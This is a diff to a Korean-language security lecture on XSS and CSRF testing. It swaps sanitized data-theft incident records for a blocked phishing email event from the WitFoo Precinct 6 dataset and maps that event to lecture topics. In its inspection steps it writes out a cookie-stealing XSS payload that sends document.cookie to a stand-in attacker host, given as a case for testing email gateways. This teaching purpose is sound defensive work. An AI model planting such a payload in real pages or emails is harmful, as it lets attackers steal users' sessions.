@@ -516,26 +516,49 @@ curl -sI http://10.20.30.80:3000 | grep -i "content-security-policy"
 
 ---
 
-## 실제 사례 (WitFoo Precinct 6)
+## 실제 사례 (WitFoo Precinct 6 — Email Phishing block 1건)
 
 > 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
-> Sanitized — RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 익명화됨.
+> 본 lecture *XSS / CSRF 점검* 과 직접 매핑되는 *web request* 는 dataset 에 부족 — 대신 *공격자가 web 외 channel 로 유사 payload 를 전달* 하는 **email_protection_event 차단** record 를 발췌 (XSS/CSRF 가 *web 단독 채널이 아니라 email link/HTML 도 사용* 한다는 학습 강화).
 
-### Case 1: `T1041 (Data Theft)` 패턴
+### Case 1: email_protection block — phishingScore=100, threatID 해시
 
+**원본 발췌**:
+
+```text
+mo_name=Phishing  action=block  severity=critical  dst=100.64.28.102
+ORG-1780 ::: HOST-0121=block ::: CRED-23501={
+  "spamSHOST-54395":100,
+  "phishSHOST-54395":100,
+  "threatsORG-0706Map":[
+    {"threatID":"f34c7acc128cd0a3c8409a6f00CRED-2962552fc3373ab290acdc9be2f2ecfe99feaf5",
+     "th..."}
+  ]
+}
 ```
-incident_id=d45fc680-cb9b-11ee-9d8c-014a3c92d0a7 mo_name=Data Theft
-red=172.25.238.143 blue=100.64.5.119 suspicion=0.25
-```
 
-**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.
+**dataset 의 email_protection_event 통계**
 
-### Case 2: `T1041 (Data Theft)` 패턴
+| 항목 | 값 |
+|------|---|
+| dst 동일 IP `100.64.28.102` | 다수 차단 이벤트 |
+| phishScore | 100 (max) |
+| spamScore | 100 (max) |
+| threatID | sha256 해시 — *동일 phishing 캠페인* 추적 키 |
+| Precinct 6 mo_name | `Phishing` (전체 dataset 에서 8건 확인된 희귀 라벨) |
 
-```
-incident_id=c6f8acf0-df14-11ee-9778-4184b1db151c mo_name=Data Theft
-red=100.64.3.190 blue=100.64.3.183 suspicion=0.25
-```
+**해석 — 본 lecture 와의 매핑**
 
-**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.
+| XSS/CSRF 점검 학습 항목 | 본 record 에서의 증거 |
+|------------------------|---------------------|
+| **다중 channel 공격** | XSS payload 는 web reflected/stored 외에 *email HTML body* 로도 전달. 본 record 가 email channel 차단 사례 — XSS 점검 시 *email-to-web flow* 도 시나리오로 |
+| **threatID 해시 추적** | sha256 형태의 threatID — XSS payload 도 *해시 기반 IOC* 로 관리 가능. 점검 보고서에 발견 payload SHA-256 기재 |
+| **score 임계 100** | phish/spam 모두 max = *고확신* 차단. 점검 시 *동일 score 정책* 으로 XSS payload 분류 (suspicion ≥ 0.8 자동 차단) |
+| **CSRF token 부재** | (본 record 자체엔 web token 정보 없음) — 학습 시 *email link 가 CSRF 시작점이 될 수 있음* — 1-click 으로 victim browser 에서 인증된 세션의 state 변경 트리거 |
+
+**점검 액션**:
+1. WAF + Email gateway 가 *동일 threatID* 로 IOC 공유하는지 확인 (현재 dataset 은 양 channel 분리 운영)
+2. 자체 점검 시 XSS payload 를 *email HTML* 에 삽입한 시나리오 추가 (e.g. `<img src=x onerror=fetch('//attacker/'+document.cookie)>` 가 SEG 통과하는지)
+3. CSRF 점검은 *Origin/Referer 헤더 검증* 외에 *email-link → 인증된 세션 액션* 추적 시나리오 포함
+
 
